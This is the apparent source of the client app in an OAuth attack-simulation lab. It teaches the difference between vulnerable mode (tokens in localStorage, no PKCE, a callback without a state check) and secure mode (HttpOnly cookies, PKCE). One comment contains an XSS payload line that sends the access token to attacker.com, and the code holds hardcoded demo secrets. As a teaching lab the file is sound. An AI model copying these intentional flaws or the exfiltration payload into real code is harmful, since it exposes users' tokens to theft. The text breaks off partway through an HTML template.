/**
 * OAuth Client Application
 * ========================
 * Simulates a typical web app using OAuth for authentication.
 *
 * ATTACKS DEMONSTRATED HERE:
 *   Attack 3: Token Leakage via Browser Storage (XSS)
 *     VULNERABLE: Access token stored in localStorage — readable by any JS (incl. XSS payload)
 *     SECURE:     Access token stored in HttpOnly cookie — inaccessible to JavaScript
 *
 *   Attack 2: Authorization Code Interception
 *     VULNERABLE: Initiates OAuth flow WITHOUT PKCE
 *     SECURE:     Initiates OAuth flow WITH PKCE (S256)
 */

require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const axios = require('axios');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3002;

const AUTH_SERVER = process.env.AUTH_SERVER || 'http://localhost:3001';
// AUTH_SERVER_PUBLIC: URL the browser will redirect to — must be localhost, not Docker hostname
const AUTH_SERVER_PUBLIC = process.env.AUTH_SERVER_PUBLIC || 'http://localhost:3001';
const RESOURCE_SERVER = process.env.RESOURCE_SERVER || 'http://localhost:3003';
const CLIENT_ID = process.env.CLIENT_ID || 'legitimate-client';
const CLIENT_SECRET = process.env.CLIENT_SECRET || 'legitimate-secret-abc123';
const SECURE_CLIENT_ID = 'secure-client';
const SECURE_CLIENT_SECRET = 'secure-secret-xyz789';

// Public-facing base URLs — override these when deploying to a real domain
const CLIENT_BASE_URL    = process.env.CLIENT_BASE_URL    || `http://localhost:${PORT}`;
const AUTH_BASE_URL      = process.env.AUTH_SERVER_PUBLIC || 'http://localhost:3001';
const RESOURCE_BASE_URL  = process.env.RESOURCE_SERVER_PUBLIC || 'http://localhost:3003';
const ATTACKER_BASE_URL  = process.env.ATTACKER_BASE_URL  || 'http://localhost:3004';
const MONITOR_BASE_URL   = process.env.MONITOR_BASE_URL   || 'http://localhost:3005';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, '../public')));

const VULNERABLE = process.env.VULNERABLE_MODE === 'true';

// In-memory PKCE state store (use Redis in production)
const pkceStore = new Map();
// In-memory state store for CSRF prevention
const stateStore = new Map();


// ── Shared nav for all server-rendered pages ──────────────────────────────────
function sharedNav(activePath = '') {
  const links = [
    { href: '/', label: '🏠 Home' },
    { href: '/lab', label: '📚 Attack Lab' },
    { href: '/login', label: '👤 Client App' },
    { href: process.env.ATTACKER_BASE_URL || 'http://localhost:3004/dashboard', label: '💀 Attacker C2', external: true },
    { href: process.env.MONITOR_BASE_URL || 'http://localhost:3005', label: '📊 Monitor', external: true },
  ];
  const navLinks = links.map(l => {
    const active = l.href === activePath;
    return `<a href="${l.href}"${l.external ? ' target="_blank"' : ''} class="sn-a${active ? ' on' : ''}">${l.label}</a>`;
  }).join('');
  return `<nav id="sn">
  <a class="sn-brand" href="/">🔐 OAuth Lab</a>
  <div class="sn-links">${navLinks}</div>
  <button class="sn-theme" onclick="document.documentElement.getAttribute('data-theme')==='dark'?document.documentElement.setAttribute('data-theme','light'):document.documentElement.setAttribute('data-theme','dark')">🌙</button>
</nav>`;
}

const SHARED_NAV_CSS = `
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
<style>
:root{--bg:#fdf6e3;--paper:#fffef7;--paper2:#fff9e8;--ink:#2d2416;--ink2:#5c4a2a;--ink3:#9c8860;--border:#d4b896;--border2:#c4a070;--red:#e05a3a;--green:#3a9e6a;--blue:#3a6eb5;--orange:#d4852a;--yellow:#e8c840;--shadow:3px 3px 0 #c4a070;--sans:'Nunito',sans-serif;--mono:'Courier Prime',monospace;--nav-h:54px}
[data-theme=dark]{--bg:#1a1612;--paper:#221e18;--paper2:#2a2520;--ink:#f0e8d5;--ink2:#c8b89a;--ink3:#8a7860;--border:#4a3c28;--border2:#5c4a32;--shadow:3px 3px 0 #0a0806}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{font-family:var(--sans);background:var(--bg);color:var(--ink);min-height:100vh}
body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:repeating-linear-gradient(0deg,transparent,transparent 27px,rgba(180,140,80,0.06) 28px)}
#sn{position:fixed;top:0;left:0;right:0;height:var(--nav-h);z-index:200;background:var(--paper);border-bottom:2px solid var(--border);display:flex;align-items:center;padding:0 16px;gap:10px;box-shadow:0 2px 0 var(--border)}
.sn-brand{font-weight:900;font-size:14px;color:var(--ink);text-decoration:none;background:var(--yellow);border:2px solid var(--ink);padding:3px 10px;border-radius:4px;box-shadow:2px 2px 0 var(--border2);transform:rotate(-1deg);transition:transform .15s;white-space:nowrap;flex-shrink:0}
.sn-brand:hover{transform:rotate(0)}
.sn-links{display:flex;align-items:center;gap:2px;flex:1;overflow-x:auto;padding:0 4px}
.sn-links::-webkit-scrollbar{height:0}
.sn-a{padding:4px 10px;border-radius:4px;font-size:12px;font-weight:700;color:var(--ink3);text-decoration:none;white-space:nowrap;border:2px solid transparent;transition:all .12s}
.sn-a:hover{background:var(--paper2);color:var(--ink);border-color:var(--border)}
.sn-a.on{background:var(--paper2);color:var(--blue);border-color:var(--border2)}
.sn-theme{background:none;border:2px solid var(--border);border-radius:4px;padding:3px 8px;cursor:pointer;font-size:14px;color:var(--ink3);margin-left:auto;flex-shrink:0}
.sn-theme:hover{border-color:var(--border2)}
.page-wrap{padding:calc(var(--nav-h) + 28px) 24px 48px;position:relative;z-index:1}
</style>`;

// ── GET /api/mode — Reports live mode (proxied from auth server for real-time toggle)
let localMode = VULNERABLE; // fallback

app.get('/api/mode', async (req, res) => {
  try {
    const r = await axios.get(`${AUTH_SERVER}/admin/mode`, { timeout: 2000 });
    localMode = r.data.vulnerable;
  } catch (_) { /* use cached localMode */ }
  res.json({
    vulnerable: localMode,
    mode: localMode ? 'VULNERABLE' : 'SECURE',
    baseUrl: CLIENT_BASE_URL,
    authUrl: AUTH_BASE_URL,
    resourceUrl: RESOURCE_BASE_URL,
    attackerUrl: ATTACKER_BASE_URL,
    monitorUrl: MONITOR_BASE_URL,
  });
});

// ── POST /api/toggle-mode — Proxies mode toggle to auth server
app.post('/api/toggle-mode', async (req, res) => {
  try {
    const r = await axios.post(`${AUTH_SERVER}/admin/toggle-mode`, {}, { timeout: 3000 });
    localMode = r.data.vulnerable;
    res.json(r.data);
  } catch (err) {
    res.status(500).json({ error: 'Could not toggle mode', detail: err.message });
  }
});

// ── Static serves public/index.html as the landing page ─────────────────────
const PORTAL = path.join(__dirname, '../public/docs/index.html');
app.get('/lab', (req, res) => res.sendFile(PORTAL));
app.get('/docs', (req, res) => res.redirect('/lab'));


// ── GET /login — Initiate OAuth flow ─────────────────────────────────────────
app.get('/login', (req, res) => {
  const state = uuidv4(); // CSRF protection
  stateStore.set(state, true);

  let authUrl;

  if (localMode) {
    /**
     * 🔴 VULNERABLE: OAuth flow WITHOUT PKCE
     *
     * No code_challenge is sent. If an attacker intercepts the authorization code
     * (via referrer header, network sniffing, malicious redirect), they can
     * exchange it for tokens at the /oauth/token endpoint directly.
     */
    authUrl = new URL(`${AUTH_SERVER_PUBLIC}/oauth/authorize`);
    authUrl.searchParams.set('response_type', 'code');
    authUrl.searchParams.set('client_id', CLIENT_ID);
    authUrl.searchParams.set('redirect_uri', `${CLIENT_BASE_URL}/callback`);
    authUrl.searchParams.set('scope', 'read profile email');
    authUrl.searchParams.set('state', state);
  } else { // localMode is false — SECURE
    /**
     * 🟢 SECURE: OAuth flow WITH PKCE (S256)
     *
     * Generate a random code_verifier, compute the SHA256 challenge,
     * send only the challenge in the authorization request.
     * Store the verifier server-side (or in HttpOnly session cookie).
     * At token exchange, the verifier is sent and verified server-side.
     *
     * Even if the auth code is intercepted, the attacker cannot exchange
     * it without knowing the code_verifier.
     */
    const codeVerifier = crypto.randomBytes(32).toString('base64url');
    const codeChallenge = crypto.createHash('sha256').update(codeVerifier).digest('base64url');
    pkceStore.set(state, codeVerifier); // Map state→verifier

    authUrl = new URL(`${AUTH_SERVER_PUBLIC}/oauth/authorize`);
    authUrl.searchParams.set('response_type', 'code');
    authUrl.searchParams.set('client_id', SECURE_CLIENT_ID);
    authUrl.searchParams.set('redirect_uri', `${CLIENT_BASE_URL}/secure-callback`);
    authUrl.searchParams.set('scope', 'read profile email');
    authUrl.searchParams.set('state', state);
    authUrl.searchParams.set('code_challenge', codeChallenge);
    authUrl.searchParams.set('code_challenge_method', 'S256');
  }

  res.redirect(authUrl.toString());
});

// ── GET /callback — OAuth callback (VULNERABLE - no PKCE) ────────────────────
app.get('/callback', async (req, res) => {
  const { code, state, error } = req.query;

  if (error) return res.send(renderError(error));

  // State validation (CSRF check)
  if (!stateStore.has(state)) {
    return res.status(400).send(renderError('Invalid state parameter — possible CSRF attack'));
  }
  stateStore.delete(state);

  try {
    const tokenResponse = await axios.post(`${AUTH_SERVER}/oauth/token`, {
      grant_type: 'authorization_code',
      code,
      redirect_uri: `${CLIENT_BASE_URL}/callback`,
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      // ⚠️ No code_verifier in VULNERABLE mode
    });

    const { access_token, refresh_token } = tokenResponse.data;

    if (localMode) {
      /**
       * 🔴 VULNERABLE: Store token in localStorage via client-side redirect
       *
       * localStorage is accessible to ANY JavaScript on the page.
       * An XSS payload can do: fetch('https://attacker.com/?t=' + localStorage.getItem('access_token'))
       * and exfiltrate the token with zero user interaction.
       */
      res.send(renderTokenStoragePage(access_token, refresh_token, true));
    } else {
      // For non-PKCE fallback in secure mode, this path shouldn't be hit
      res.redirect('/dashboard');
    }
  } catch (err) {
    res.status(500).send(renderError('Token exchange failed: ' + (err.response?.data?.error || err.message)));
  }
});

// ── GET /secure-callback — OAuth callback (SECURE - with PKCE) ───────────────
app.get('/secure-callback', async (req, res) => {
  const { code, state, error } = req.query;

  if (error) return res.send(renderError(error));

  if (!stateStore.has(state)) {
    return res.status(400).send(renderError('Invalid state — CSRF protection triggered'));
  }

  const codeVerifier = pkceStore.get(state);
  stateStore.delete(state);
  pkceStore.delete(state);

  try {
    const tokenResponse = await axios.post(`${AUTH_SERVER}/oauth/token`, {
      grant_type: 'authorization_code',
      code,
      redirect_uri: `${CLIENT_BASE_URL}/secure-callback`,
      client_id: SECURE_CLIENT_ID,
      client_secret: SECURE_CLIENT_SECRET,
      code_verifier: codeVerifier,  // ✅ PKCE verification
    });

    const { access_token, refresh_token } = tokenResponse.data;

    /**
     * 🟢 SECURE: Store tokens in HttpOnly, Secure, SameSite=Strict cookies
     *
     * HttpOnly: JavaScript CANNOT read this cookie (prevents XSS token theft)
     * Secure:   Only sent over HTTPS (prevents network interception)
     * SameSite: Prevents CSRF-based token misuse
     *
     * The token never touches the browser's JavaScript environment.
     */
    res.cookie('access_token', access_token, {
      httpOnly: true,       // 🔐 JS cannot access
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'Strict',   // 🔐 Prevents CSRF
      maxAge: 3600 * 1000,  // 1 hour
    });
    res.cookie('refresh_token', refresh_token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'Strict',
      maxAge: 30 * 24 * 3600 * 1000, // 30 days
      path: '/refresh',     // Only sent to refresh endpoint
    });

    res.redirect('/dashboard');
  } catch (err) {
    res.status(500).send(renderError('Token exchange failed: ' + (err.response?.data?.error || err.message)));
  }
});

// ── GET /dashboard — Protected resource ──────────────────────────────────────
app.get('/dashboard', async (req, res) => {
  const token = req.cookies.access_token;

  if (localMode) {
    // 🔴 VULNERABLE MODE: token is in localStorage (not a cookie), so the server
    // cannot read it. Render a client-side dashboard that reads localStorage
    // and calls the resource server directly from the browser.
    return res.send(renderVulnerableDashboard(RESOURCE_SERVER));
  }

  if (!token) {
    return res.redirect('/login');
  }

  try {
    const response = await axios.get(`${RESOURCE_SERVER}/api/profile`, {
      headers: { Authorization: `Bearer ${token}` },
    });
    res.send(renderDashboard(response.data, localMode));
  } catch (err) {
    res.send(renderDashboard(null, localMode, err.response?.data || err.message));
  }
});


// ── GET /attack-callback — Attack 6 scope escalation callback (no state check) ─
// This endpoint exists specifically for Attack 6 (scope escalation).
// The portal constructs the OAuth URL directly (bypassing /login which sets state),
// so we need a callback that doesn't enforce the state/CSRF check.
// In a real app this would be a security flaw; here it's intentional for the demo.
app.get('/attack-callback', async (req, res) => {
  const { code, state, error } = req.query;
  if (error) return res.send(renderError('Authorization error: ' + error));
  if (!code) return res.send(renderError('No authorization code received'));

  try {
    const tokenResponse = await axios.post(`${AUTH_SERVER}/oauth/token`, {
      grant_type: 'authorization_code',
      code,
      redirect_uri: `${CLIENT_BASE_URL}/attack-callback`,
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
    });
    const { access_token, refresh_token } = tokenResponse.data;
    // Always show token in localStorage for scope inspection
    res.send(renderTokenStoragePage(access_token, refresh_token, true, '⚠️ Attack 6: Scope Escalation — check the token scopes below!'));
  } catch (err) {
    res.status(500).send(renderError('Token exchange failed: ' + (err.response?.data?.error || err.message)));
  }
});

// ── GET /refresh — Token refresh endpoint ────────────────────────────────────
app.get('/refresh', async (req, res) => {
  const refreshToken = req.cookies.refresh_token;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  try {
    const response = await axios.post(`${AUTH_SERVER}/oauth/token`, {
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      client_id: SECURE_CLIENT_ID,
      client_secret: SECURE_CLIENT_SECRET,
    });

    res.cookie('access_token', response.data.access_token, {
      httpOnly: true, secure: false, sameSite: 'Strict', maxAge: 3600 * 1000,
    });
    res.cookie('refresh_token', response.data.refresh_token, {
      httpOnly: true, secure: false, sameSite: 'Strict',
      maxAge: 30 * 24 * 3600 * 1000, path: '/refresh',
    });

    res.json({ success: true, message: 'Token refreshed and rotated' });
  } catch (err) {
    res.status(400).json({ error: err.response?.data || err.message });
  }
});

// ── HTML Renderers ─────────────────────────────────────────────────────────────
function renderHome(vulnerable) {
  const modeColor  = vulnerable ? '#f16767' : '#48d17a';
  const modeBorder = vulnerable ? 'rgba(241,103,103,.3)' : 'rgba(72,209,122,.3)';
  const modeBg     = vulnerable ? 'rgba(241,103,103,.1)' : 'rgba(72,209,122,.1)';
  const modeText   = vulnerable ? 'VULNERABLE' : 'SECURE';

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OAuth Security Lab</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0b0d12;--s1:#111520;--s2:#171c28;--s3:#1e2535;
  --bd:#262f42;--bd2:#344057;
  --tx:#dde4f0;--t2:#8b9ab8;--t3:#4e5d7a;
  --ac:#4d9fff;--rd:#f16767;--gn:#48d17a;--or:#f5a623;
  --mono:'JetBrains Mono',monospace;
  --sans:'Inter',system-ui,sans-serif;
}
html,body{height:100%}
body{font-family:var(--sans);background:var(--bg);color:var(--tx);font-size:14px;line-height:1.6;min-height:100vh}
::-webkit-scrollbar{width:4px}
::-webkit-scrollbar-thumb{background:var(--bd2);border-radius:2px}
a{color:var(--ac);text-decoration:none}
a:hover{text-decoration:underline}

/* NAV */
#nav{
  position:sticky;top:0;z-index:100;
  background:var(--s1);border-bottom:1px solid var(--bd);
  height:52px;display:flex;align-items:center;padding:0 24px;gap:0;
}
.nav-brand{
  display:flex;align-items:center;gap:8px;
  font-weight:700;font-size:14px;color:var(--tx);
  text-decoration:none;white-space:nowrap;flex-shrink:0;margin-right:24px;
}
.nav-brand .by{font-size:12px;font-weight:400;color:var(--t3);margin-left:2px}
.nav-brand .by a{color:var(--t2)}
.nav-links{display:flex;align-items:center;gap:2px;flex:1}
.nav-link{
  padding:5px 12px;border-radius:5px;
  font-size:13px;font-weight:500;color:var(--t3);
  text-decoration:none;transition:background .12s,color .12s;
}
.nav-link:hover{background:var(--s3);color:var(--t2);text-decoration:none}
.nav-link.active{background:var(--s3);color:var(--tx)}
.nav-right{margin-left:auto;display:flex;align-items:center;gap:10px}
.mode-btn{
  display:flex;align-items:center;gap:6px;
  padding:5px 12px;border-radius:5px;
  font-size:11.5px;font-weight:600;font-family:var(--mono);
  cursor:pointer;border:1px solid;transition:opacity .15s;
  background:${modeBg};color:${modeColor};border-color:${modeBorder};
}
.mode-btn:hover{opacity:.75}
.mdot{width:6px;height:6px;border-radius:50%;background:${modeColor};animation:blink 2s infinite;flex-shrink:0}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}

/* LAYOUT */
.shell{display:flex;min-height:calc(100vh - 52px)}

/* SIDEBAR */
#sb{
  width:230px;flex-shrink:0;
  background:var(--s1);border-right:1px solid var(--bd);
  padding:14px 0 40px;position:sticky;top:52px;
  height:calc(100vh - 52px);overflow-y:auto;
}
.sb-lbl{font-size:10px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.1em;padding:10px 16px 3px}
.sb-a{
  display:flex;align-items:center;gap:8px;
  padding:6px 16px;font-size:13px;font-weight:500;color:var(--t2);
  text-decoration:none;border-left:2px solid transparent;
  transition:background .1s,color .1s,border-color .1s;
}
.sb-a:hover{background:var(--s2);color:var(--tx);text-decoration:none}
.sb-a.on{background:var(--s2);color:var(--ac);border-left-color:var(--ac)}
.sb-ico{width:15px;text-align:center;font-size:13px;flex-shrink:0}
.sb-pill{margin-left:auto;font-size:9px;font-weight:700;padding:1px 5px;border-radius:3px;font-family:var(--mono)}
.p-hi{background:rgba(245,166,35,.15);color:var(--or)}
.p-cr{background:rgba(241,103,103,.15);color:var(--rd)}
.sb-div{height:1px;background:var(--bd);margin:6px 16px}
.ldot{display:inline-block;width:5px;height:5px;border-radius:50%;background:var(--gn);animation:blink 2s infinite}
.ldot.r{background:var(--rd)}

/* MAIN */
#main{flex:1;padding:40px 52px 80px;max-width:860px}
.eyebrow{font-size:11px;font-weight:600;font-family:var(--mono);color:var(--ac);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px}
h1{font-size:24px;font-weight:700;line-height:1.2;margin-bottom:8px}
.lead{font-size:15px;color:var(--t2);line-height:1.8;margin-bottom:28px;max-width:560px}
.hero-btns{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:36px}
.btn-p{
  display:inline-flex;align-items:center;gap:6px;
  background:#1a4a8a;color:#93c5fd;border:1px solid rgba(77,159,255,.3);
  padding:9px 18px;border-radius:5px;font-size:13px;font-weight:600;
  text-decoration:none;transition:background .12s;
}
.btn-p:hover{background:#1e5599;text-decoration:none}
.btn-s{
  display:inline-flex;align-items:center;gap:6px;
  background:var(--s2);color:var(--t2);border:1px solid var(--bd);
  padding:9px 18px;border-radius:5px;font-size:13px;font-weight:600;
  text-decoration:none;transition:background .12s;
}
.btn-s:hover{background:var(--s3);color:var(--tx);text-decoration:none}

/* Section divider */
.div-row{display:flex;align-items:center;gap:10px;margin:28px 0 14px}
.div-lbl{font-size:10.5px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.1em;white-space:nowrap}
.div-line{flex:1;height:1px;background:var(--bd)}

/* Mode toggle card */
.mode-card{
  background:var(--s1);border:1px solid var(--bd);border-radius:6px;
  padding:18px 20px;display:flex;align-items:center;justify-content:space-between;
  gap:16px;flex-wrap:wrap;
}
.mode-card-info{}
.mode-card-badge{font-size:13px;font-weight:700;color:${modeColor};margin-bottom:4px}
.mode-card-desc{font-size:12.5px;color:var(--t2);line-height:1.65;max-width:480px}
.toggle-btn{
  padding:9px 18px;border-radius:5px;font-size:13px;font-weight:600;
  cursor:pointer;border:1px solid;transition:opacity .15s;white-space:nowrap;
  background:${vulnerable ? 'rgba(72,209,122,.1)' : 'rgba(241,103,103,.1)'};
  color:${vulnerable ? 'var(--gn)' : 'var(--rd)'};
  border-color:${vulnerable ? 'rgba(72,209,122,.3)' : 'rgba(241,103,103,.3)'};
}
.toggle-btn:hover{opacity:.75}
#toggle-status{font-size:12px;color:var(--t3);margin-top:6px;min-height:16px}

/* How-to */
.howto{background:var(--s1);border:1px solid var(--bd);border-radius:6px;padding:18px 20px}
.howto h3{font-size:14px;font-weight:600;color:var(--tx);margin-bottom:12px}
.steps{list-style:none;counter-reset:s;padding:0}
.steps li{counter-increment:s;display:flex;gap:12px;padding:8px 0;border-bottom:1px solid var(--bd);font-size:13px;color:var(--t2);line-height:1.7}
.steps li:last-child{border-bottom:none}
.steps li::before{content:counter(s);background:var(--ac);color:#fff;font-weight:700;font-size:10px;min-width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px}

/* Service cards */
.svc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:9px;margin-bottom:4px}
.svc-card{background:var(--s1);border:1px solid var(--bd);border-radius:6px;padding:14px;text-decoration:none;transition:border-color .15s;display:block}
.svc-card:hover{border-color:var(--ac);text-decoration:none}
.svc-icon{font-size:18px;margin-bottom:7px}
.svc-name{font-size:13px;font-weight:600;color:var(--tx);margin-bottom:3px}
.svc-desc{font-size:11.5px;color:var(--t3);line-height:1.5}
.svc-url{font-size:11px;font-family:var(--mono);color:var(--ac);margin-top:7px;word-break:break-all}

/* Attack list */
.atk-list{display:flex;flex-direction:column;gap:7px}
.atk-row{
  display:flex;align-items:center;gap:12px;
  background:var(--s1);border:1px solid var(--bd);border-radius:6px;
  padding:12px 14px;text-decoration:none;transition:border-color .15s;
}
.atk-row:hover{border-color:var(--bd2);text-decoration:none}
.arow-n{
  width:30px;height:30px;border-radius:5px;background:var(--s3);
  font-weight:800;font-size:13px;font-family:var(--mono);color:var(--tx);
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
}
.arow-info{flex:1}
.arow-title{font-size:13px;font-weight:600;color:var(--tx)}
.arow-sub{font-size:11.5px;color:var(--t3);margin-top:2px}
.arow-r{display:flex;align-items:center;gap:7px;flex-shrink:0}
.sev{font-size:10px;font-weight:700;padding:2px 6px;border-radius:3px;font-family:var(--mono)}
.sev-hi{background:rgba(245,166,35,.15);color:var(--or)}
.sev-cr{background:rgba(241,103,103,.15);color:var(--rd)}
.fbadge{font-size:10px;padding:2px 6px;border-radius:3px;background:var(--s3);color:var(--t3);font-family:var(--mono);border:1px solid var(--bd)}

/* Creds */
table{width:100%;border-collapse:collapse;font-size:13px;margin:4px 0 8px}
thead th{background:var(--s2);color:var(--t3);font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;padding:8px 12px;text-align:left;border-bottom:1px solid var(--bd)}
tbody td{padding:8px 12px;border-bottom:1px solid var(--bd);color:var(--t2);vertical-align:top}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover td{background:var(--s2)}
code{font-family:var(--mono);font-size:11px;background:var(--s3);color:#93c5fd;padding:1px 5px;border-radius:3px;border:1px solid var(--bd)}

/* footer */
.pgfoot{margin-top:48px;padding-top:14px;border-top:1px solid var(--bd);font-size:11.5px;color:var(--t3);display:flex;justify-content:space-between}
</style>
</head>
<body>

<nav id="nav">
  <a class="nav-brand" href="/">🔐 OAuth Security Lab <span class="by">by <a href="https://github.com/SinhaAmrit" target="_blank">SinhaAmrit</a></span></a>
  <div class="nav-links">
    <a class="nav-link active" href="/">Home</a>
    <a class="nav-link" href="/docs">Docs Portal</a>
    <a class="nav-link" href="${AUTH_BASE_URL}/admin/audit-log" target="_blank">Audit Log</a>
    <a class="nav-link" href="${MONITOR_BASE_URL}" target="_blank">Monitoring</a>
    <a class="nav-link" href="https://github.com/SinhaAmrit/oauth-security-lab" target="_blank">GitHub ↗</a>
  </div>
  <div class="nav-right">
    <button class="mode-btn" onclick="toggleMode()">
      <span class="mdot"></span>
      <span id="mlbl">${modeText}</span>
    </button>
  </div>
</nav>

<div class="shell">

<aside id="sb">
  <div class="sb-lbl">Lab</div>
  <a class="sb-a on" href="/"><span class="sb-ico">🏠</span>Home</a>
  <a class="sb-a" href="/login"><span class="sb-ico">🔐</span>Start OAuth Flow</a>
  <a class="sb-a" href="/docs"><span class="sb-ico">📚</span>Docs Portal</a>
  <div class="sb-div"></div>
  <div class="sb-lbl">Attack Scenarios</div>
  <a class="sb-a" href="/docs#a1"><span class="sb-ico">🎯</span>1 · Redirect URI<span class="sb-pill p-hi">HIGH</span></a>
  <a class="sb-a" href="/docs#a2"><span class="sb-ico">🎯</span>2 · Code Intercept<span class="sb-pill p-hi">HIGH</span></a>
  <a class="sb-a" href="/docs#a3"><span class="sb-ico">🎯</span>3 · XSS Leakage<span class="sb-pill p-hi">HIGH</span></a>
  <a class="sb-a" href="/docs#a4"><span class="sb-ico">🎯</span>4 · Consent Abuse<span class="sb-pill p-hi">HIGH</span></a>
  <a class="sb-a" href="/docs#a5"><span class="sb-ico">🎯</span>5 · Refresh Abuse<span class="sb-pill p-cr">CRIT</span></a>
  <a class="sb-a" href="/docs#a6"><span class="sb-ico">🎯</span>6 · Scope Escalation<span class="sb-pill p-hi">HIGH</span></a>
  <a class="sb-a" href="/docs#a7"><span class="sb-ico">🎯</span>7 · JWT alg=none<span class="sb-pill p-cr">CRIT</span></a>
  <div class="sb-div"></div>
  <div class="sb-lbl">Services</div>
  <a class="sb-a" href="/" ><span class="sb-ico">🌐</span>Client App<span class="ldot" style="margin-left:auto"></span></a>
  <a class="sb-a" href="${AUTH_BASE_URL}/.well-known/oauth-authorization-server" target="_blank"><span class="sb-ico">🔑</span>Auth Server<span class="ldot" style="margin-left:auto"></span></a>
  <a class="sb-a" href="${RESOURCE_BASE_URL}/health" target="_blank"><span class="sb-ico">🛡</span>Resource API<span class="ldot" style="margin-left:auto"></span></a>
  <a class="sb-a" href="${ATTACKER_BASE_URL}/dashboard" target="_blank"><span class="sb-ico">💀</span>Attacker C2<span class="ldot r" style="margin-left:auto"></span></a>
  <a class="sb-a" href="${MONITOR_BASE_URL}" target="_blank"><span class="sb-ico">📊</span>Monitoring<span class="ldot" style="margin-left:auto"></span></a>
</aside>

<main id="main">
  <div class="eyebrow">Security Research Lab</div>
  <h1>OAuth 2.0 Attack Simulation Lab</h1>
  <p class="lead">Seven real-world OAuth vulnerabilities — each with a live exploit and working mitigation. Toggle between Vulnerable and Secure mode to compare behaviour in real time.</p>
  <div class="hero-btns">
    <a class="btn-p" href="/login">🔐 Start OAuth Flow</a>
    <a class="btn-s" href="/docs">📚 Docs &amp; Walkthroughs</a>
    <a class="btn-s" href="${MONITOR_BASE_URL}" target="_blank">📊 Monitoring</a>
    <a class="btn-s" href="https://github.com/SinhaAmrit/oauth-security-lab" target="_blank">⭐ GitHub</a>
  </div>

  <div class="div-row"><span class="div-lbl">Getting Started</span><span class="div-line"></span></div>
  <div class="howto">
    <h3>How to use this lab</h3>
    <ol class="steps">
      <li>You are in <strong style="color:${modeColor}">${modeText} MODE</strong>. In Vulnerable mode all 7 attacks are exploitable. In Secure mode all mitigations are active.</li>
      <li>Click <a href="/login">Start OAuth Flow</a> — log in as <code>alice / password123</code> to run a real Authorization Code flow through the auth server.</li>
      <li>Go to <a href="/docs">Docs Portal</a>, pick an attack, and follow the step-by-step walkthrough with runnable curl commands.</li>
      <li>Keep <a href="${MONITOR_BASE_URL}" target="_blank">Monitoring</a> open in a separate tab — security events appear live as attacks fire.</li>
      <li>Use the mode toggle above to switch modes without restarting Docker.</li>
    </ol>
  </div>

  <div class="div-row"><span class="div-lbl">Current Mode</span><span class="div-line"></span></div>
  <div class="mode-card">
    <div class="mode-card-info">
      <div class="mode-card-badge">${modeText} MODE</div>
      <div class="mode-card-desc">${vulnerable
        ? 'All 7 attacks are exploitable. Tokens use localStorage, PKCE is disabled, redirect URIs use prefix matching, refresh tokens never rotate.'
        : 'All mitigations active. Tokens in HttpOnly cookies, PKCE required, exact URI matching, refresh tokens rotate on every use.'
      }</div>
    </div>
    <button class="toggle-btn" id="toggleBtn" onclick="toggleMode()">
      Switch to ${vulnerable ? '🟢 Secure' : '🔴 Vulnerable'} Mode
    </button>
  </div>
  <div id="toggle-status"></div>

  <div class="div-row"><span class="div-lbl">Lab Services</span><span class="div-line"></span></div>
  <div class="svc-grid">
    <a class="svc-card" href="/login">
      <div class="svc-icon">🌐</div>
      <div class="svc-name">Client App</div>
      <div class="svc-desc">Start here. Click Login to begin an OAuth flow.</div>
      <div class="svc-url"><span class="ldot" style="margin-right:4px"></span>${CLIENT_BASE_URL}</div>
    </a>
    <a class="svc-card" href="${AUTH_BASE_URL}/.well-known/oauth-authorization-server" target="_blank">
      <div class="svc-icon">🔑</div>
      <div class="svc-name">Auth Server</div>
      <div class="svc-desc">Issues authorization codes and JWT tokens.</div>
      <div class="svc-url"><span class="ldot" style="margin-right:4px"></span>${AUTH_BASE_URL}</div>
    </a>
    <a class="svc-card" href="${RESOURCE_BASE_URL}/health" target="_blank">
      <div class="svc-icon">🛡</div>
      <div class="svc-name">Resource API</div>
      <div class="svc-desc">Protected API. Validates JWTs and enforces scopes.</div>
      <div class="svc-url"><span class="ldot" style="margin-right:4px"></span>${RESOURCE_BASE_URL}</div>
    </a>
    <a class="svc-card" href="${ATTACKER_BASE_URL}/dashboard" target="_blank">
      <div class="svc-icon">💀</div>
      <div class="svc-name">Attacker C2</div>
      <div class="svc-desc">Captures stolen codes and tokens. JWT forge tool.</div>
      <div class="svc-url"><span class="ldot r" style="margin-right:4px"></span>${ATTACKER_BASE_URL}</div>
    </a>
    <a class="svc-card" href="${MONITOR_BASE_URL}" target="_blank">
      <div class="svc-icon">📊</div>
      <div class="svc-name">Monitoring</div>
      <div class="svc-desc">Real-time security event dashboard.</div>
      <div class="svc-url"><span class="ldot" style="margin-right:4px"></span>${MONITOR_BASE_URL}</div>
    </a>
